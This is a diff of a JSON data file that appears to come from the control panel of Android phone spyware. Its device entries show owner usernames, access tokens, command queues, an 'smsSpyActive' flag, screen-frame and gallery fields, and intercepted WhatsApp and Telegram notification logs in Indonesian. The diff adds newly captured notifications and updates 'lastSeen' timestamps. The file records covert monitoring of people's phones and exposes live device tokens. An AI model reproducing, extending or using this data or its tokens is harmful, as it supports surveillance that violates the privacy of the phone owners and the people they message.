@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776768349010,
+    "lastSeen": 1776768353066,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -5068,6 +5068,14 @@
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
+        "content": "‎‎3840 pesan dari 21 chat",
+        "time": "21/04 17:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768354498
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
         "content": "‎‎3839 pesan dari 21 chat",
         "time": "21/04 17:45",
         "pkg": "com.whatsapp",
@@ -9056,14 +9064,6 @@
         "time": "21/04 17:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1776766845640
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎4270 pesan dari 20 chat",
-        "time": "21/04 17:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766840562
       }
     ],
     "galleryPhotos": [],
@@ -9082,7 +9082,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776768348344,
+    "lastSeen": 1776768350952,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9123,7 +9123,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776768349432,
+    "lastSeen": 1776768352540,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9139,6 +9139,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:45",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768349655
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5773 pesan baru dari 49 obrolan",
+        "time": "21/04 17:45",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768349594
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
